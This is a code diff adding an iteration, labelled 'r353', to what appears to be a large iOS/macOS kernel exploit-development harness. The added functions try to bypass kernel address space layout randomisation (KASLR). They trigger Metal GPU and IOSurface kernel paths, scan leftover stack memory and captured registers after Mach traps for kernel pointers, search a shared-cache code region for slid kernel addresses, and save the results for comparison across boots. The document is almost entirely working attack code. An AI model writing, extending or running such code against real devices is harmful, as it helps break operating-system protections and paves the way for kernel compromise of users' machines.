@@ -14472,6 +14472,525 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+/* r353 helpers */
+static int r353_is_known_constant(uint64_t v) {
+    uint64_t known[] = {
+        0xfffffff007004000ULL, 0xfffffff007000000ULL,
+        0xfffffff027004000ULL, 0xfffffff037004000ULL,
+        0xfffffff047004000ULL, 0xfffffff017004000ULL,
+        0xfffffff00f004000ULL, 0xfffffff000000000ULL,
+        0xfffffff800000000ULL, 0xffffffc000000000ULL,
+        0xffffffe000000000ULL, 0xffffffe100000000ULL,
+        0xffffffe200000000ULL, 0xffffffe400000000ULL,
+        0xffffffffffffc000ULL, 0xffffffffffc00000ULL,
+        0xffffffffffffff00ULL, 0xffffffffff0400f7ULL,
+        0xfffffffffb440e00ULL, 0xfffffc820e008100ULL,
+        0
+    };
+    for (int i = 0; known[i]; i++) {
+        if (v == known[i]) return 1;
+    }
+    /* Small constants in upper word */
+    if ((v & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFF00000000ULL &&
+        (v & 0x00000000FFFFFFFFULL) < 0x10000)
+        return 1;
+    /* Page-aligned TTBR-style entries */
+    if ((v & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL &&
+        (v & 0x0000000FFFFFFFFFULL) == 0)
+        return 1;
+    return 0;
+}
+
+static void __attribute__((noinline)) r353_metal_trigger(void) {
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    if (!metal_lib) return;
+
+    typedef void *(*MTLCreateDev_t)(void);
+    MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+    void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    if (!createDev || !msgSend || !regSel) { dlclose(metal_lib); return; }
+
+    void *dev = createDev();
+    if (!dev) { dlclose(metal_lib); return; }
+
+    void *cmdQ = ((void*(*)(void*,void*))msgSend)(dev, regSel("newCommandQueue"));
+    if (!cmdQ) { dlclose(metal_lib); return; }
+
+    /* Create several buffers of different sizes */
+    void *selNewBuf = regSel("newBufferWithLength:options:");
+    void *buf1 = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(dev, selNewBuf, 4096, 0UL);
+    void *buf2 = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(dev, selNewBuf, 65536, 0UL);
+    void *buf3 = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(dev, selNewBuf, 262144, 0UL);
+
+    /* Encode multiple blit operations to maximize GPU kernel interaction */
+    for (int batch = 0; batch < 3; batch++) {
+        void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+        if (!cmdBuf) continue;
+
+        void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, regSel("blitCommandEncoder"));
+        if (blit) {
+            typedef struct { unsigned long loc; unsigned long len; } NSR353;
+            void *selFill = regSel("fillBuffer:range:value:");
+            if (buf1) {
+                NSR353 r1 = {0, 4096};
+                ((void(*)(void*,void*,void*,NSR353,uint8_t))msgSend)(blit, selFill, buf1, r1, 0xAA + batch);
+            }
+            if (buf2) {
+                NSR353 r2 = {0, 65536};
+                ((void(*)(void*,void*,void*,NSR353,uint8_t))msgSend)(blit, selFill, buf2, r2, 0xBB + batch);
+            }
+            if (buf3) {
+                NSR353 r3 = {0, 262144};
+                ((void(*)(void*,void*,void*,NSR353,uint8_t))msgSend)(blit, selFill, buf3, r3, 0xCC + batch);
+            }
+            ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+        }
+        ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("commit"));
+        ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("waitUntilCompleted"));
+    }
+
+    /* Also create and use an IOSurface via IOKit to trigger different kernel paths */
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    if (svc) {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (conn) {
+            /* Call a few selectors to exercise the kernel */
+            uint64_t scOut[8] = {0};
+            uint32_t scOutCnt = 8;
+            IOConnectCallMethod(conn, 0, NULL, 0, NULL, 0, scOut, &scOutCnt, NULL, NULL);
+            scOutCnt = 8;
+            IOConnectCallMethod(conn, 1, NULL, 0, NULL, 0, scOut, &scOutCnt, NULL, NULL);
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(svc);
+    }
+
+    void *selRelease = regSel("release");
+    if (buf1) ((void(*)(void*,void*))msgSend)(buf1, selRelease);
+    if (buf2) ((void(*)(void*,void*))msgSend)(buf2, selRelease);
+    if (buf3) ((void(*)(void*,void*))msgSend)(buf3, selRelease);
+    ((void(*)(void*,void*))msgSend)(cmdQ, selRelease);
+    dlclose(metal_lib);
+}
+
+static void r353_probe(void) {
+    rlog("\n=== r353: Targeted KASLR — Stack Spray + Register Leak ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+    uint64_t kvals[10];
+    int kval_count = 0;
+
+    #define IS_KPTR353(v) ( \
+        ((v) != 0) && \
+        ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) != 0xFFFFFFFF00000000ULL) && \
+        ((v) != 0xFFFFFFFF00000001ULL) && \
+        ((v) != 0xFFFFFFFF89ABCDEFULL) && \
+        (((v) & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL) && \
+        (((v) & 0x0000000000000003ULL) == 0) \
+    )
+
+    /* ---- Part 1: Targeted stack spray capture ---- */
+    rlog("--- Part 1: Stack spray capture after Metal/AGX kernel ops ---\n");
+    fflush(stdout);
+    {
+        /* Call Metal trigger in separate stack frame */
+        r353_metal_trigger();
+
+        /* Now scan dead stack frames below our current SP */
+        volatile char stack_anchor = 0;
+        uint64_t *sp = (uint64_t *)&stack_anchor;
+        /* Scan downward (lower addresses = deeper/older frames on arm64) */
+        int found = 0;
+        rlog("  Current SP area: %p\n", sp);
+        /* Scan 8192 qwords below current position (64KB of stack) */
+        for (int i = 1; i < 8192 && found < 30; i++) {
+            uint64_t *probe = sp - i;
+            /* Bounds check: don't go below the stack guard page */
+            uint64_t v = *probe;
+            if (IS_KPTR353(v) && !r353_is_known_constant(v)) {
+                rlog("  *** STACK sp-%d (-%zu) = 0x%llx ***\n",
+                    i, (size_t)(i * 8), (unsigned long long)v);
+                /* Record unique values */
+                int dup = 0;
+                for (int k = 0; k < kval_count; k++) {
+                    if (kvals[k] == v) { dup = 1; break; }
+                }
+                if (!dup && kval_count < 10) {
+                    kvals[kval_count++] = v;
+                }
+                found++;
+            }
+        }
+        rlog("  Stack scan: %d hits, %d unique kernel-range values\n\n", found, kval_count);
+
+        /* Also scan upward (higher addresses = caller frames) */
+        int found_up = 0;
+        for (int i = 1; i < 8192 && found_up < 20; i++) {
+            uint64_t *probe = sp + i;
+            uint64_t v = *probe;
+            if (IS_KPTR353(v) && !r353_is_known_constant(v)) {
+                rlog("  *** STACK sp+%d (+%zu) = 0x%llx ***\n",
+                    i, (size_t)(i * 8), (unsigned long long)v);
+                int dup = 0;
+                for (int k = 0; k < kval_count; k++) {
+                    if (kvals[k] == v) { dup = 1; break; }
+                }
+                if (!dup && kval_count < 10) {
+                    kvals[kval_count++] = v;
+                }
+                found_up++;
+            }
+        }
+        rlog("  Upward scan: %d hits\n\n", found_up);
+    }
+
+    /* ---- Part 2: Register capture after Mach traps ---- */
+    rlog("--- Part 2: Register capture (x9-x17) after Mach traps ---\n");
+    fflush(stdout);
+    {
+        uint64_t r9, r10, r11, r12, r13, r14, r15, r16, r17;
+        uint64_t regs[9];
+        const char *reg_names[] = {"x9","x10","x11","x12","x13","x14","x15","x16","x17"};
+
+        /* Trap 1: mach_vm_region_recurse */
+        rlog("  Trap: mach_vm_region_recurse\n");
+        {
+            __asm__ volatile(
+                "mov x9, xzr\n" "mov x10, xzr\n" "mov x11, xzr\n"
+                "mov x12, xzr\n" "mov x13, xzr\n" "mov x14, xzr\n"
+                "mov x15, xzr\n" "mov x16, xzr\n" "mov x17, xzr\n"
+                ::: "x9","x10","x11","x12","x13","x14","x15","x16","x17"
+            );
+
+            mach_vm_address_t addr = 0;
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+
+            __asm__ volatile(
+                "mov %0, x9\n" "mov %1, x10\n" "mov %2, x11\n"
+                "mov %3, x12\n" "mov %4, x13\n" "mov %5, x14\n"
+                "mov %6, x15\n" "mov %7, x16\n" "mov %8, x17\n"
+                : "=r"(r9), "=r"(r10), "=r"(r11), "=r"(r12),
+                  "=r"(r13), "=r"(r14), "=r"(r15), "=r"(r16), "=r"(r17)
+            );
+            regs[0]=r9; regs[1]=r10; regs[2]=r11; regs[3]=r12;
+            regs[4]=r13; regs[5]=r14; regs[6]=r15; regs[7]=r16; regs[8]=r17;
+            for (int i = 0; i < 9; i++) {
+                if (IS_KPTR353(regs[i]) && !r353_is_known_constant(regs[i])) {
+                    rlog("    *** %s = 0x%llx ***\n", reg_names[i], (unsigned long long)regs[i]);
+                    int dup = 0;
+                    for (int k = 0; k < kval_count; k++) {
+                        if (kvals[k] == regs[i]) { dup = 1; break; }
+                    }
+                    if (!dup && kval_count < 10) kvals[kval_count++] = regs[i];
+                } else if (regs[i] != 0) {
+                    rlog("    %s = 0x%llx\n", reg_names[i], (unsigned long long)regs[i]);
+                }
+            }
+        }
+
+        /* Trap 2: task_info(TASK_VM_INFO) */
+        rlog("  Trap: task_info(TASK_VM_INFO)\n");
+        {
+            __asm__ volatile(
+                "mov x9, xzr\n" "mov x10, xzr\n" "mov x11, xzr\n"
+                "mov x12, xzr\n" "mov x13, xzr\n" "mov x14, xzr\n"
+                "mov x15, xzr\n" "mov x16, xzr\n" "mov x17, xzr\n"
+                ::: "x9","x10","x11","x12","x13","x14","x15","x16","x17"
+            );
+
+            uint64_t vminfo[80];
+            memset(vminfo, 0, sizeof(vminfo));
+            mach_msg_type_number_t cnt = sizeof(vminfo)/sizeof(natural_t);
+            task_info(mach_task_self(), 22, (task_info_t)vminfo, &cnt);
+
+            __asm__ volatile(
+                "mov %0, x9\n" "mov %1, x10\n" "mov %2, x11\n"
+                "mov %3, x12\n" "mov %4, x13\n" "mov %5, x14\n"
+                "mov %6, x15\n" "mov %7, x16\n" "mov %8, x17\n"
+                : "=r"(r9), "=r"(r10), "=r"(r11), "=r"(r12),
+                  "=r"(r13), "=r"(r14), "=r"(r15), "=r"(r16), "=r"(r17)
+            );
+            regs[0]=r9; regs[1]=r10; regs[2]=r11; regs[3]=r12;
+            regs[4]=r13; regs[5]=r14; regs[6]=r15; regs[7]=r16; regs[8]=r17;
+            for (int i = 0; i < 9; i++) {
+                if (IS_KPTR353(regs[i]) && !r353_is_known_constant(regs[i])) {
+                    rlog("    *** %s = 0x%llx ***\n", reg_names[i], (unsigned long long)regs[i]);
+                    int dup = 0;
+                    for (int k = 0; k < kval_count; k++) {
+                        if (kvals[k] == regs[i]) { dup = 1; break; }
+                    }
+                    if (!dup && kval_count < 10) kvals[kval_count++] = regs[i];
+                } else if (regs[i] != 0) {
+                    rlog("    %s = 0x%llx\n", reg_names[i], (unsigned long long)regs[i]);
+                }
+            }
+        }
+
+        /* Trap 3: mach_port_kobject */
+        rlog("  Trap: mach_port_kobject\n");
+        {
+            /* Create an IOSurface port for kobject */
+            CFMutableDictionaryRef p353 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w353=32,h353=32,b353=4,r353=128,pf353=0x42475241,as353=32*32*4;
+            CFNumberRef n353[6];
+            n353[0]=CFNumberCreate(NULL,kCFNumberIntType,&w353);
+            n353[1]=CFNumberCreate(NULL,kCFNumberIntType,&h353);
+            n353[2]=CFNumberCreate(NULL,kCFNumberIntType,&b353);
+            n353[3]=CFNumberCreate(NULL,kCFNumberIntType,&r353);
+            n353[4]=CFNumberCreate(NULL,kCFNumberIntType,&pf353);
+            n353[5]=CFNumberCreate(NULL,kCFNumberIntType,&as353);
+            CFDictionarySetValue(p353,CFSTR("IOSurfaceWidth"),n353[0]);
+            CFDictionarySetValue(p353,CFSTR("IOSurfaceHeight"),n353[1]);
+            CFDictionarySetValue(p353,CFSTR("IOSurfaceBytesPerElement"),n353[2]);
+            CFDictionarySetValue(p353,CFSTR("IOSurfaceBytesPerRow"),n353[3]);
+            CFDictionarySetValue(p353,CFSTR("IOSurfacePixelFormat"),n353[4]);
+            CFDictionarySetValue(p353,CFSTR("IOSurfaceAllocSize"),n353[5]);
+            for(int i=0;i<6;i++) CFRelease(n353[i]);
+            IOSurfaceRef s353 = IOSurfaceCreate(p353);
+            CFRelease(p353);
+            if (s353) {
+                mach_port_t mp353 = IOSurfaceCreateMachPort(s353);
+                if (mp353 != MACH_PORT_NULL) {
+                    __asm__ volatile(
+                        "mov x9, xzr\n" "mov x10, xzr\n" "mov x11, xzr\n"
+                        "mov x12, xzr\n" "mov x13, xzr\n" "mov x14, xzr\n"
+                        "mov x15, xzr\n" "mov x16, xzr\n" "mov x17, xzr\n"
+                        ::: "x9","x10","x11","x12","x13","x14","x15","x16","x17"
+                    );
+
+                    unsigned int kotype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    mach_port_kobject(mach_task_self(), mp353, &kotype, (unsigned int *)&kaddr);
+
+                    __asm__ volatile(
+                        "mov %0, x9\n" "mov %1, x10\n" "mov %2, x11\n"
+                        "mov %3, x12\n" "mov %4, x13\n" "mov %5, x14\n"
+                        "mov %6, x15\n" "mov %7, x16\n" "mov %8, x17\n"
+                        : "=r"(r9), "=r"(r10), "=r"(r11), "=r"(r12),
+                          "=r"(r13), "=r"(r14), "=r"(r15), "=r"(r16), "=r"(r17)
+                    );
+                    regs[0]=r9; regs[1]=r10; regs[2]=r11; regs[3]=r12;
+                    regs[4]=r13; regs[5]=r14; regs[6]=r15; regs[7]=r16; regs[8]=r17;
+                    for (int i = 0; i < 9; i++) {
+                        if (IS_KPTR353(regs[i]) && !r353_is_known_constant(regs[i])) {
+                            rlog("    *** %s = 0x%llx ***\n", reg_names[i], (unsigned long long)regs[i]);
+                            int dup = 0;
+                            for (int k = 0; k < kval_count; k++) {
+                                if (kvals[k] == regs[i]) { dup = 1; break; }
+                            }
+                            if (!dup && kval_count < 10) kvals[kval_count++] = regs[i];
+                        } else if (regs[i] != 0) {
+                            rlog("    %s = 0x%llx\n", reg_names[i], (unsigned long long)regs[i]);
+                        }
+                    }
+                    mach_port_deallocate(mach_task_self(), mp353);
+                }
+                CFRelease(s353);
+            }
+        }
+
+        /* Trap 4: IOConnectCallMethod on IOSurfaceRoot */
+        rlog("  Trap: IOConnectCallMethod(IOSurfaceRoot)\n");
+        {
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (svc) {
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                if (kr == 0 && conn) {
+                    __asm__ volatile(
+                        "mov x9, xzr\n" "mov x10, xzr\n" "mov x11, xzr\n"
+                        "mov x12, xzr\n" "mov x13, xzr\n" "mov x14, xzr\n"
+                        "mov x15, xzr\n" "mov x16, xzr\n" "mov x17, xzr\n"
+                        ::: "x9","x10","x11","x12","x13","x14","x15","x16","x17"
+                    );
+
+                    uint64_t scIn[1] = {1};
+                    uint64_t scOut[8] = {0};
+                    uint32_t scOutCnt = 8;
+                    IOConnectCallMethod(conn, 0, scIn, 1, NULL, 0, scOut, &scOutCnt, NULL, NULL);
+
+                    __asm__ volatile(
+                        "mov %0, x9\n" "mov %1, x10\n" "mov %2, x11\n"
+                        "mov %3, x12\n" "mov %4, x13\n" "mov %5, x14\n"
+                        "mov %6, x15\n" "mov %7, x16\n" "mov %8, x17\n"
+                        : "=r"(r9), "=r"(r10), "=r"(r11), "=r"(r12),
+                          "=r"(r13), "=r"(r14), "=r"(r15), "=r"(r16), "=r"(r17)
+                    );
+                    regs[0]=r9; regs[1]=r10; regs[2]=r11; regs[3]=r12;
+                    regs[4]=r13; regs[5]=r14; regs[6]=r15; regs[7]=r16; regs[8]=r17;
+                    for (int i = 0; i < 9; i++) {
+                        if (IS_KPTR353(regs[i]) && !r353_is_known_constant(regs[i])) {
+                            rlog("    *** %s = 0x%llx ***\n", reg_names[i], (unsigned long long)regs[i]);
+                            int dup = 0;
+                            for (int k = 0; k < kval_count; k++) {
+                                if (kvals[k] == regs[i]) { dup = 1; break; }
+                            }
+                            if (!dup && kval_count < 10) kvals[kval_count++] = regs[i];
+                        } else if (regs[i] != 0) {
+                            rlog("    %s = 0x%llx\n", reg_names[i], (unsigned long long)regs[i]);
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+        }
+        rlog("  Register scan unique kvals so far: %d\n\n", kval_count);
+    }
+
+    /* ---- Part 3: Shared cache KTRR region scan ---- */
+    rlog("--- Part 3: Shared cache r-x region kernel VA constant analysis ---\n");
+    fflush(stdout);
+    {
+        /* Find the r-x region that r352 showed at ~0x104534000 */
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int region_num = 0;
+
+        while (region_num < 500) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz,
+                &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            /* Look for r-x regions containing kernel constants */
+            if (info.protection == 5 && sz >= 800000) {
+                rlog("  r-x region: 0x%llx sz=0x%llx tag=%u\n",
+                    (unsigned long long)addr, (unsigned long long)sz, info.user_tag);
+
+                /* Dump qwords from offset 761000 to 770000 */
+                size_t scan_start = 760000;
+                size_t scan_end = 770000;
+                if (scan_end > (size_t)sz) scan_end = (size_t)sz;
+                if (scan_start >= (size_t)sz) { addr += sz; region_num++; continue; }
+
+                uint64_t *base = (uint64_t *)((uintptr_t)addr + scan_start);
+                size_t nqw = (scan_end - scan_start) / 8;
+                int kconst_count = 0;
+                int novel_count = 0;
+
+                rlog("  Scanning offsets %zu-%zu (%zu qwords):\n", scan_start, scan_end, nqw);
+                for (size_t i = 0; i < nqw; i++) {
+                    uint64_t v = base[i];
+                    if (IS_KPTR353(v)) {
+                        int is_const = r353_is_known_constant(v);
+                        size_t off = scan_start + i * 8;
+                        if (is_const) {
+                            kconst_count++;
+                        } else {
+                            rlog("    *** NOVEL +%zu = 0x%llx ***\n",
+                                off, (unsigned long long)v);
+                            novel_count++;
+                            int dup = 0;
+                            for (int k = 0; k < kval_count; k++) {
+                                if (kvals[k] == v) { dup = 1; break; }
+                            }
+                            if (!dup && kval_count < 10) kvals[kval_count++] = v;
+                        }
+                    }
+                }
+                rlog("  Region: %d known constants, %d novel kptr values\n\n",
+                    kconst_count, novel_count);
+
+                /* Extended scan: check ALL kernel-range values in the region for slid addresses */
+                rlog("  Extended: checking all kernel-range values for slid base...\n");
+                uint64_t *full = (uint64_t *)(uintptr_t)addr;
+                size_t fullqw = (size_t)sz / 8;
+                if (fullqw > 262144) fullqw = 262144;
+                int slid_count = 0;
+                for (size_t i = 0; i < fullqw && slid_count < 20; i++) {
+                    uint64_t v = full[i];
+                    if (!IS_KPTR353(v) || r353_is_known_constant(v)) continue;
+                    /* Check if this could be a slid kernel text address:
+                       unslid base = 0xfffffff007004000
+                       slid base = 0xfffffff007004000 + slide (slide is page-aligned, up to ~512MB) */
+                    if (v >= 0xfffffff007004000ULL && v < 0xfffffff027004000ULL) {
+                        uint64_t slide = v - 0xfffffff007004000ULL;
+                        if ((slide & 0x3FFF) == 0) { /* page-aligned */
+                            rlog("    *** SLID CANDIDATE +%zu = 0x%llx (slide=0x%llx) ***\n",
+                                i * 8, (unsigned long long)v, (unsigned long long)slide);
+                            slid_count++;
+                        }
+                    }
+                    /* Also check kernel heap range */
+                    if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL ||
+                        (v & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL) {
+                        if (!r353_is_known_constant(v)) {
+                            rlog("    HEAP? +%zu = 0x%llx\n", i * 8, (unsigned long long)v);
+                            slid_count++;
+                        }
+                    }
+                }
+                rlog("  Extended scan: %d slid/heap candidates\n", slid_count);
+                break;
+            }
+            addr += sz;
+            region_num++;
+        }
+    }
+
+    /* ---- Part 4: Cross-boot correlation ---- */
+    rlog("\n--- Part 4: Cross-boot correlation state ---\n");
+    fflush(stdout);
+    {
+        struct timeval boottime;
+        size_t bt_size = sizeof(boottime);
+        int mib[2] = { CTL_KERN, KERN_BOOTTIME };
+        if (sysctl(mib, 2, &boottime, &bt_size, NULL, 0) == 0) {
+            rlog("  Boot time: %ld.%06d\n", (long)boottime.tv_sec, boottime.tv_usec);
+        } else {
+            boottime.tv_sec = 0;
+            boottime.tv_usec = 0;
+            rlog("  Boot time: sysctl failed\n");
+        }
+
+        uint64_t abs_time = mach_absolute_time();
+        rlog("  mach_absolute_time: 0x%llx\n", (unsigned long long)abs_time);
+
+        rlog("  Collected %d unique kernel-range values:\n", kval_count);
+        for (int i = 0; i < kval_count; i++) {
+            rlog("    [%d] 0x%llx\n", i, (unsigned long long)kvals[i]);
+        }
+
+        /* Write state file for cross-launch comparison */
+        FILE *sf = fopen("r353_state.bin", "wb");
+        if (sf) {
+            uint32_t magic = 0xDEAD0353;
+            fwrite(&magic, 4, 1, sf);
+            uint64_t bt = (uint64_t)boottime.tv_sec;
+            fwrite(&bt, 8, 1, sf);
+            uint32_t cnt = (uint32_t)kval_count;
+            fwrite(&cnt, 4, 1, sf);
+            for (int i = 0; i < 10; i++) {
+                uint64_t v = (i < kval_count) ? kvals[i] : 0;
+                fwrite(&v, 8, 1, sf);
+            }
+            fclose(sf);
+            rlog("  State written to r353_state.bin\n");
+        }
+    }
+
+    rlog("\n=== r353 complete ===\n");
+    fflush(stdout);
+    #undef IS_KPTR353
+}
+
 static void r352_probe(void) {
     rlog("\n=== r352: KASLR Bypass — AGX Deep Scan + UAF Property Leak ===\n\n");
     fflush(stdout);
@@ -50082,6 +50601,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 356) {
+            rlog("*** rounds=356: KASLR Bypass — Targeted Stack/Register/KTRR Scan ***\n");
+            rlog("  r352: Stack value 0xFFFFFFFEFBxxxxxx changed between AGX passes.\n");
+            rlog("  r353: targeted stack spray, register capture, extended KTRR scan.\n\n");
+            fflush(stdout);
+            r353_probe();
+            goto done;
+        }
         if (rounds == 355) {
             rlog("*** rounds=355: KASLR Bypass — AGX Deep Scan + UAF Property Leak ***\n");
             rlog("  r351: 30 candidates, mostly sentinels. 2 real: 0xfffffffffb440e00,\n");
@@ -52134,7 +52661,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -61976,7 +62503,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
